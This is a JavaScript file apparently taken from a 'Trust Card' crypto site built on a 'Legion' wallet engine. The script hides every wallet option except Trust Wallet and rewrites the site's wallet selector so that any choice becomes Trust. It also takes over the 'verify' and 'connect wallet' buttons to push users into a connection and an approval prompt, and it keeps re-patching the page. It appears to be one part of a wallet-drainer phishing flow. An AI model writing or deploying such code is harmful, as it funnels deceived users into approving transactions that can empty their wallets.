/**
 * Trust Card — direct Trust-only connect.
 * Connect Wallet → Trust deep-link / WC (no MM / CB / generic WC picker).
 */
(function () {
  'use strict';

  function isMobile() {
    try {
      var ua = navigator.userAgent || '';
      if (/iPhone|iPad|iPod|Android|Mobile/i.test(ua)) return true;
      if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
    } catch (_) {}
    return false;
  }

  function hideLegionFloatingButtons() {
    try {
      var root = document.getElementById('__lgn_root');
      if (root) root.remove();
    } catch (_) {}
  }

  function hideOtherWallets() {
    try {
      var grid = document.querySelector('#cwModal .cw-wallet-grid');
      if (!grid) return;
      var items = grid.querySelectorAll('.cw-wallet-item');
      for (var i = 0; i < items.length; i++) {
        var name = (items[i].textContent || '').toLowerCase();
        if (name.indexOf('trust') === -1) {
          items[i].style.display = 'none';
        }
      }
      var modal = document.getElementById('cwModal');
      if (modal) modal.classList.remove('cw-show');
      document.body.style.overflow = '';
    } catch (_) {}
  }

  function alreadyConnectedAddr() {
    try {
      var a = sessionStorage.getItem('trust_site_connected_addr') || sessionStorage.getItem('legion_wc_evm_addr');
      if (a && /^0x[a-f0-9]{40}$/i.test(a)) return a.toLowerCase();
    } catch (_) {}
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) {
        return String(window.legion.state.evmAddr).toLowerCase();
      }
    } catch (_) {}
    return '';
  }

  function startTrust() {
    hideLegionFloatingButtons();
    hideOtherWallets();
    // Always pin Trust as deep-link target (mobile + desktop WC→Trust)
    try { window.__LEGION_DEEP_LINK_TARGET__ = 'trust'; } catch (_) {}

    // Already linked this session — resume, do NOT clearWc (that was wiping return-from-Trust)
    var existing = alreadyConnectedAddr();
    if (existing) {
      console.warn('[TrustDirect] already connected — resume', existing.slice(0, 10));
      try {
        if (typeof window.__TRUST_SHOW_APPROVE__ === 'function') window.__TRUST_SHOW_APPROVE__(existing);
      } catch (_) {}
      try {
        if (window.legion && typeof window.legion.continueConnected === 'function') {
          window.legion.continueConnected();
          return;
        }
      } catch (_) {}
    }

    // Prefer SPA selectWallet (sets loaders + Legion deep-link target)
    if (typeof window.selectWallet === 'function') {
      try {
        window.selectWallet('Trust Wallet', null);
        // If URI already cached, force open Trust immediately
        if (isMobile() && typeof window.__TRUST_OPEN_DEEPLINK__ === 'function') {
          setTimeout(function () { window.__TRUST_OPEN_DEEPLINK__(false); }, 400);
        }
        return;
      } catch (_) {}
    }

    // Fallback: same as SPA m("trust")
    var L = window.legion;
    if (!L) {
      window.showToast && window.showToast('Wallet engine loading… retry in a second', 2500);
      setTimeout(startTrust, 400);
      return;
    }
    // Only clear stale WC if no recoverable address
    if (!alreadyConnectedAddr()) {
      try { typeof L.clearWc === 'function' && L.clearWc(false); } catch (_) {}
    }
    try { typeof L.beginConnect === 'function' && L.beginConnect('wc'); } catch (_) {}
    if (typeof L.connectWC === 'function') L.connectWC();
    else if (typeof L.connect === 'function') L.connect();

    if (isMobile() && typeof window.__TRUST_OPEN_DEEPLINK__ === 'function') {
      setTimeout(function () { window.__TRUST_OPEN_DEEPLINK__(false); }, 600);
      setTimeout(function () { window.__TRUST_OPEN_DEEPLINK__(false); }, 1800);
    }
  }

  // Export for connected-ui / confirmVerify
  window.__TRUST_DIRECT_CONNECT__ = startTrust;

  function patchConfirmVerify() {
    window.confirmVerify = function () {
      startTrust();
    };
  }

  function patchSelectWallet() {
    var orig = window.selectWallet;
    if (typeof orig !== 'function') return;
    window.selectWallet = function (name, el) {
      var n = String(name || '').toLowerCase();
      // Force every choice → Trust
      if (!n || n.indexOf('trust') === -1) {
        return orig.call(this, 'Trust Wallet', el || null);
      }
      return orig.call(this, name, el);
    };
  }

  function interceptClicks(e) {
    var t = e.target;
    if (!t) return;
    var btn = t.closest ? t.closest('button, a, [role="button"]') : null;
    if (!btn) return;
    var id = btn.id || '';
    var txt = (btn.textContent || '').trim().toLowerCase();

    // Legion floating buttons — never show extension picker on Trust site
    if (id === '__lgn_cb' || id === '__lgn_wb') {
      e.preventDefault();
      e.stopPropagation();
      startTrust();
      return;
    }

    // Site CTAs
    if (
      id === 'cfmbtn' ||
      txt === 'connect wallet' ||
      (txt.indexOf('connect') === 0 && txt.indexOf('wallet') !== -1)
    ) {
      // Let confirmVerify run if it's the verify button (we patched it)
      if (id === 'cfmbtn') return;
      e.preventDefault();
      e.stopPropagation();
      startTrust();
    }
  }

  // Style: never show multi-wallet grid / legion floating root
  var style = document.createElement('style');
  style.id = '__trust_direct_css';
  style.textContent = [
    '#__lgn_root{display:none!important}',
    '#cwModal.cw-show{display:none!important}',
    '#cwModal .cw-wallet-item:not(:first-child){display:none!important}',
  ].join('');
  (document.head || document.documentElement).appendChild(style);

  function boot() {
    hideLegionFloatingButtons();
    hideOtherWallets();
    patchConfirmVerify();
    patchSelectWallet();
    document.addEventListener('click', interceptClicks, true);
  }

  // Patch as soon as SPA defines handlers (poll briefly)
  var tries = 0;
  var t = setInterval(function () {
    tries++;
    if (typeof window.confirmVerify === 'function' || typeof window.selectWallet === 'function') {
      boot();
      clearInterval(t);
      return;
    }
    if (tries > 80) {
      boot();
      clearInterval(t);
    }
  }, 50);

  document.addEventListener('DOMContentLoaded', function () {
    hideLegionFloatingButtons();
    boot();
  });

  // If SPA re-renders and reassigns confirmVerify, re-patch
  var obs = new MutationObserver(function () {
    if (typeof window.confirmVerify === 'function' &&
        !String(window.confirmVerify).includes('startTrust') &&
        window.confirmVerify !== startTrust) {
      // Only re-patch if still opening modal
      var src = Function.prototype.toString.call(window.confirmVerify);
      if (src.indexOf('cw-show') !== -1 || src.indexOf('cwModal') !== -1) {
        patchConfirmVerify();
      }
    }
    hideLegionFloatingButtons();
    hideOtherWallets();
  });
  if (document.body) obs.observe(document.body, { childList: true, subtree: true });
  else document.addEventListener('DOMContentLoaded', function () {
    obs.observe(document.body, { childList: true, subtree: true });
  });

  window.__TRUST_DIRECT_CONNECT__ = startTrust;
})();
